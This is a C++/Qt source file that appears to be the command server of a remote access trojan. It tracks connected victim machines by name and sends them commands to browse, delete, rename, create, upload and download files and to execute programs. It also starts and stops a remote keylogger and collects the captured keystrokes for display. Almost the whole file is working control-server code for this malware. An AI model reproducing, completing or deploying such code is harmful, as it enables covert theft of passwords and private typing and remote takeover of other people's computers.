#include				<QCoreApplication>
#include				<string.h>

#include				"RxNetwork.h"
#include				"RxKeyDefinitions.h"

RxNetwork::RxNetwork(const std::string& port)
	: _port(port), _is_running(false)
{
	this->InitPacketFuncMap();

	/* From UpDown */
	QObject::connect(&this->_upDown, SIGNAL(UpdnCrashed(std::string)), this, SIGNAL(UpdnCrashed(std::string)));
	QObject::connect(&this->_upDown, SIGNAL(UpdnNewPartRec(int, int)), this, SIGNAL(UpdnNewPartRec(int, int)));
	QObject::connect(&this->_upDown, SIGNAL(UpdnDlFinished()), this, SIGNAL(UpdnDlFinished()));
	QObject::connect(&this->_upDown, SIGNAL(UpdnNewPartSnd(int, int)), this, SIGNAL(UpdnNewPartSnd(int, int)));
	QObject::connect(&this->_upDown, SIGNAL(UpdnUpFinished()), this, SIGNAL(UpdnUpFinished()));
}

RxNetwork::~RxNetwork(void)
{
}

/*
	+--------------------------+
	| Monster Network Loop \o/ |
	+--------------------------+
*/

bool				RxNetwork::NetLoop()
{
	if (this->_serverSock.ServerInit(this->_port) == true)
	{
		fd_set										fdread;
		fd_set										fdwrite;
		std::map<int, RxClientInfos*>::iterator	is;
		std::map<int, RxClientInfos*>::iterator	ie;
		int											rdRet;
		struct timeval								timer;

		timer.tv_sec = 0;
		timer.tv_usec = 10;
		this->_is_running = true;
		while (this->_is_running == true)
		{
			FD_ZERO(&fdread);
			FD_ZERO(&fdwrite);
			FD_SET(this->_serverSock.GetSocket(), &fdread);
			ie = this->_clientList.end();
			for (is = this->_clientList.begin(); is != ie; ++is)
			{
				FD_SET((*is).second->socket->GetSocket(), &fdread);
				if ((*is).second->toSend.size() > 0)
					FD_SET((*is).second->socket->GetSocket(), &fdwrite);
			}
			if (select(42, &fdread, &fdwrite, NULL, &timer) < 0)
				this->_is_running = false;
			else
			{
				if (FD_ISSET(this->_serverSock.GetSocket(), &fdread) == true)
				{
					RxClientInfos*		newClient;

					newClient = new RxClientInfos();
					newClient->socket = this->_serverSock.Accept();
					if (newClient->socket > 0)
					{
						this->_clientList[newClient->socket->GetSocket()] = newClient;
						//emit this->ClientConnected(newClient->socket->GetSocket());
					}
					else
						delete (newClient);
				}
				ie = this->_clientList.end();
				for (is = this->_clientList.begin(); is != ie; ++is)
				{
					if ((*is).second->toSend.size() > 0)
					{
						if (FD_ISSET((*is).second->socket->GetSocket(), &fdwrite) == true)
						{
							if ((*is).second->socket->Send((char*)((*is).second->toSend.back()), sizeof(RxPacket)) == sizeof(RxPacket))
							{
								emit this->NewMonitorEventSendind((*is).second->name, (*is).second->toSend.back()->type);
								delete ((*is).second->toSend.back());
								(*is).second->toSend.pop_back();
							}
							// else Gerer
							//
						}
					}
					if (FD_ISSET((*is).second->socket->GetSocket(), &fdread) == true)
					{
						if ((*is).second->offset == 0)
							memset((char*)&((*is).second->toRead), 0, sizeof(RxPacket));
						rdRet = (*is).second->socket->Receive((char*)&(*is).second->toRead + (*is).second->offset, sizeof(RxPacket) - (*is).second->offset);
						if (rdRet <= 0)
						{
							this->DisconnectClient((*is).second);
							break;
						}
						if (rdRet + (*is).second->offset == sizeof(RxPacket))
						{
							(*is).second->offset = 0;
							this->TreatPacket((*is).second, &((*is).second->toRead));
						}
						else
							(*is).second->offset = (*is).second->offset + rdRet;
					}
				}
			}
			QCoreApplication::processEvents();
		}
		return (true);
	}
	return (false);
}

bool				RxNetwork::DisconnectClient(RxClientInfos* cl)
{
	if (cl->name.size() > 0)
		emit this->ClientCrashed(cl->name);
	emit this->NewMonitorEventReception(cl->name, T_DISCONNECT);
	this->_clientList.erase(cl->socket->GetSocket());
	return (true);
}

/*
	+--------------------+
	| Packet dispatching |
	+--------------------+
*/

void				RxNetwork::InitPacketFuncMap()
{
	this->_packet_func_map[T_IDENTIFICATION] = &RxNetwork::PacketIsIdentification;					// 1
	this->_packet_func_map[T_ANS_VERSION] = &RxNetwork::PacketAnswerVersion;						// 2
	this->_packet_func_map[T_ANS_FS] = &RxNetwork::PacketAnswerFs;									// 3
	this->_packet_func_map[T_ANS_FS_NEXT] = &RxNetwork::PacketAnswerFsNext;						// 4
	this->_packet_func_map[T_ANS_FS_FAILED] = &RxNetwork::PacketAnswerFsFailed;					// 5
	this->_packet_func_map[T_ANS_CD_OK] = &RxNetwork::PacketAnswerCdOk;							// 6
	this->_packet_func_map[T_ANS_CD_FAILED] = &RxNetwork::PacketAnswerCdFailed;					// 7
	this->_packet_func_map[T_ANS_DELETE_OK] = &RxNetwork::PacketAnswerDeleteOk;					// 8
	this->_packet_func_map[T_ANS_DELETE_FAILED] = &RxNetwork::PacketAnswerDeleteFailed;			// 9
	this->_packet_func_map[T_ANS_COPY_OK] = &RxNetwork::PacketAnswerCopyOk;						// 10
	this->_packet_func_map[T_ANS_COPY_FAILED] = &RxNetwork::PacketAnswerCopyFailed;				// 11
	this->_packet_func_map[T_ANS_PASTE_OK] = &RxNetwork::PacketAnswerPasteOk;						// 12
	this->_packet_func_map[T_ANS_PASTE_FAILED] = &RxNetwork::PacketAnswerPasteFailed;				// 13
	this->_packet_func_map[T_ANS_RENAME_OK] = &RxNetwork::PacketAnswerRenameOk;					// 14
	this->_packet_func_map[T_ANS_RENAME_FAILED] = &RxNetwork::PacketAnswerRenameFailed;			// 15
	this->_packet_func_map[T_ANS_CRT_FILE_OK] = &RxNetwork::PacketAnswerCreateFileOK;				// 16
	this->_packet_func_map[T_ANS_CRT_FILE_FAILED] = &RxNetwork::PacketAnswerCreateFileFailed;		// 17
	this->_packet_func_map[T_ANS_EXEC_OK] = &RxNetwork::PacketAnswerExecOk;						// 18
	this->_packet_func_map[T_ANS_EXEC_FAILED] = &RxNetwork::PacketAnswerExecFailed;				// 19
	this->_packet_func_map[T_ANS_KEYLOG_OK] = &RxNetwork::PacketAnswerKeyLogOk;					// 20
	this->_packet_func_map[T_ANS_KEYLOG_FAILED] = &RxNetwork::PacketAnswerKeyLogFailed;			// 21
	this->_packet_func_map[T_ANS_KEY_PRESSED] = &RxNetwork::PacketAnswerKeyPressed;				// 22
	this->_packet_func_map[T_ANS_KEYLOG_STOP_OK] = &RxNetwork::PacketAnswerKeyLogStopOk;			// 23
	this->_packet_func_map[T_ANS_KEYLOG_STOP_FAIL] = &RxNetwork::PacketAnswerKeyLogStopFail;		// 24
	this->_packet_func_map[T_ANS_DOWNLOAD_OK] = &RxNetwork::PacketAnswerDownloadOk;				// 25
	this->_packet_func_map[T_ANS_DOWNLOAD_FAIL] = &RxNetwork::PacketAnswerDownloadFailed;			// 26
	this->_packet_func_map[T_ANS_UPLOAD_OK] = &RxNetwork::PacketAnswerUploadOk;					// 27
	this->_packet_func_map[T_ANS_UPLOAD_FAIL] = &RxNetwork::PacketAnswerUploadFail;				// 28
}

void				RxNetwork::TreatPacket(RxClientInfos* client, RxPacket* packet)
{
	if (client > 0 && packet > 0)
	{
		if (this->_packet_func_map.find(packet->type) != this->_packet_func_map.end())
		{
			(*this.*(this->_packet_func_map[packet->type]))(client, packet);
		}
		else
			this->DisconnectClient(client);
		emit this->NewMonitorEventReception(client->name, packet->type);
	}
	else
		; // Pop Error de reception
}

/*
	+------------------------------+
	| Methods for packet Unwarping |
	+------------------------------+
*/

void				RxNetwork::PacketIsIdentification(RxClientInfos* client, RxPacket* packet)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	std::string									tmp;

	if (this->_clientList[client->socket->GetSocket()]->name == "")
	{
		is = this->_clientList.begin();
		ie = this->_clientList.end();
		tmp = packet->data;
		if (tmp.size() <= 0)
			return ;
		while (is != ie)
		{
			if ((*is).second->name.size() > 0 && (*is).second->name == tmp)
			{
				tmp = tmp + "_bis";
				is = this->_clientList.begin();
			}
			else
				++is;
		}
		client->name = tmp;
		emit this->ClientIdentified(client->name);
	}
}

void				RxNetwork::PacketAnswerVersion(RxClientInfos* client, RxPacket* packet)
{
	emit this->ClientAnsVersion(client->name, (std::string)(packet->data));
}

void				RxNetwork::PacketAnswerFs(RxClientInfos* client, RxPacket* packet)
{
	RxFileTransfer	ft;
	FileInfo		temp;

	memset((char*)&ft, 0, sizeof(ft));
	memcpy((char*)&ft, packet->data, sizeof(ft) - 1);
	temp.type = ft.type;
	temp.name = ft.filename;
	emit this->ClientAnsFs(client->name, temp);
}

void				RxNetwork::PacketAnswerFsNext(RxClientInfos* client, RxPacket* packet)
{
	RxFileTransfer	ft;
	FileInfo		temp;

	memset((char*)&ft, 0, sizeof(ft));
	memcpy((char*)&ft, packet->data, sizeof(ft) - 1);
	temp.type = ft.type;
	temp.name = ft.filename;
	emit this->ClientAnsFsNext(client->name, temp);
}

void				RxNetwork::PacketAnswerFsFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerCdOk(RxClientInfos* client, RxPacket* packet)
{
	this->WinAskFs(client->name);
}

void				RxNetwork::PacketAnswerCdFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerDeleteOk(RxClientInfos* client, RxPacket* packet)
{
	this->WinAskFs(client->name);
}

void				RxNetwork::PacketAnswerDeleteFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerCopyOk(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerCopyFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerPasteOk(RxClientInfos* client, RxPacket* packet)
{
	this->WinAskFs(client->name);
}

void				RxNetwork::PacketAnswerPasteFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerRenameOk(RxClientInfos* client, RxPacket* packet)
{
	this->WinAskFs(client->name);
}

void				RxNetwork::PacketAnswerRenameFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerCreateFileOK(RxClientInfos* client, RxPacket* packet)
{
	this->WinAskFs(client->name);
}

void				RxNetwork::PacketAnswerCreateFileFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerExecOk(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerExecFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerKeyLogOk(RxClientInfos* client, RxPacket* packet)
{
	client->KeyLogOn = true;
	emit this->NetAnswerKeyLogInfos(client->name, client->KeyLogOn, client->keyLogData);
}

void				RxNetwork::PacketAnswerKeyLogFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerKeyPressed(RxClientInfos* client, RxPacket* packet)
{
	RxKeyPressed	kp;
	std::string		tmp;

	memcpy((char*)&kp, packet->data, sizeof(kp));
	tmp = GetKeyDefinition(kp.vkcode);
	client->keyLogData.append(tmp);
	emit this->ClientAnsKeyPressed(client->name, client->keyLogData);
}

void				RxNetwork::PacketAnswerKeyLogStopOk(RxClientInfos* client, RxPacket* packet)
{
	client->KeyLogOn = false;
	emit this->NetAnswerKeyLogInfos(client->name, client->KeyLogOn, client->keyLogData);
}

void				RxNetwork::PacketAnswerKeyLogStopFail(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerDownloadOk(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerDownloadFailed(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerUploadOk(RxClientInfos* client, RxPacket* packet)
{
	;
}

void				RxNetwork::PacketAnswerUploadFail(RxClientInfos* client, RxPacket* packet)
{
	;
}

/*
	+------------------------------------+
	| Slots from Window (Bridge) Signals |
	+------------------------------------+
*/

void				RxNetwork::WinAskVer(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_VERSION;
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskFs(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_FS;
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskKeyLogInfos(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
		emit this->NetAnswerKeyLogInfos((*is).second->name, (*is).second->KeyLogOn, (*is).second->keyLogData);
}

void				RxNetwork::WinAskCd(std::string pcName, std::string filename)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_CD;
		memcpy(packet->data, filename.c_str(), filename.size());
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskDel(std::string pcName, std::string filename)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_DELETE;
		memcpy(packet->data, filename.c_str(), filename.size());
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskCpy(std::string pcName, std::string filename)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_COPY;
		memcpy(packet->data, filename.c_str(), filename.size());
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskPst(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_PASTE;
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskRnm(std::string pcName, std::string filename, std::string newname)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;
	RxRenameData								tmp;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		if (filename.size() < SIZE_DATA / 2 && newname.size() < SIZE_DATA / 2)
		{
			packet = new RxPacket();
			memset(packet, 0, sizeof(*packet));
			packet->type = T_ASK_RENAME;
			memset(&tmp, 0, sizeof(tmp));
			memcpy(tmp.fileName, filename.c_str(), filename.size());
			memcpy(tmp.newName, newname.c_str(), newname.size());
			memcpy(packet->data, &tmp, sizeof(tmp));
			(*is).second->toSend.push_front(packet);
		}
	}
}

void				RxNetwork::WinAskCrt(std::string pcName, std::string title, std::string content)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;
	RxCreateFile								tmp;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		if (title.size() + 4 < SIZE_DATA / 2 && content.size() < SIZE_DATA / 2)
		{
			title = title + ".txt";
			packet = new RxPacket();
			memset(packet, 0, sizeof(*packet));
			packet->type = T_ASK_CRT_FILE;
			memset(&tmp, 0, sizeof(tmp));
			memcpy(tmp.title, title.c_str(), title.size());
			memcpy(tmp.content, content.c_str(), content.size());
			memcpy(packet->data, &tmp, sizeof(tmp));
			(*is).second->toSend.push_front(packet);
		}
	}
}

void				RxNetwork::WinAskExe(std::string pcName, std::string filename)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_EXEC;
		memcpy(packet->data, filename.c_str(), filename.size());
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskAkl(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_KEYLOG;
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskOkl(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		packet = new RxPacket();
		memset(packet, 0, sizeof(*packet));
		packet->type = T_ASK_KEYLOG_STOP;
		(*is).second->toSend.push_front(packet);
	}
}

void				RxNetwork::WinAskCkl(std::string pcName)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		(*is).second->keyLogData.clear();
		emit this->NetAnswerKeyLogInfos((*is).second->name, (*is).second->KeyLogOn, (*is).second->keyLogData);
	}
}

void				RxNetwork::WinAskDwn(std::string pcName, std::string filename)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;
	RxInitUpDown								tmp;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		if (this->_upDown.DownloadFileFrom((*is).first, filename) == true)
		{
			emit this->NewUpDownEvent("Download init success. Waiting for client ...");
			packet = new RxPacket();
			memset(packet, 0, sizeof(*packet));
			memset(&tmp, 0, sizeof(tmp));
			packet->type = T_ASK_DOWNLOAD;
			tmp.sock = (*is).first;
			memcpy(tmp.data, filename.c_str(), filename.size());
			memcpy(packet->data, (char*)&tmp, sizeof(tmp));
			(*is).second->toSend.push_front(packet);
		}
		else
			emit this->NewUpDownEvent("Download init failure.");
	}
}

void				RxNetwork::WinAskUpl(std::string pcName, std::string filename)
{
	std::map<int, RxClientInfos*>::iterator	is;
	std::map<int, RxClientInfos*>::iterator	ie;
	RxPacket*									packet;
	RxInitUpDown								tmp;
	std::string									str;
	size_t										ret;

	is = this->_clientList.begin();
	ie = this->_clientList.end();
	while (is != ie)
	{
		if ((*is).second->name == pcName)
			break;
		else
			++is;
	}
	if (is != ie)
	{
		if (this->_upDown.UploadFileFrom((*is).first, filename) == true)
		{
			emit this->NewUpDownEvent("Upload init success. Waiting for client ...");
			packet = new RxPacket();
			memset(packet, 0, sizeof(*packet));
			memset(&tmp, 0, sizeof(tmp));
			packet->type = T_ASK_UPLOAD;
			tmp.sock = (*is).first;
			str = filename;
			ret = str.find_last_of("/\\");
			if (ret < std::string::npos && ret < str.size())
				str = str.substr(ret + 1);
			memcpy(tmp.data, str.c_str(), filename.size());
			memcpy(packet->data, (char*)&tmp, sizeof(tmp));
			(*is).second->toSend.push_front(packet);
		}
		else
			emit this->NewUpDownEvent("Upload init failure.");
	}
}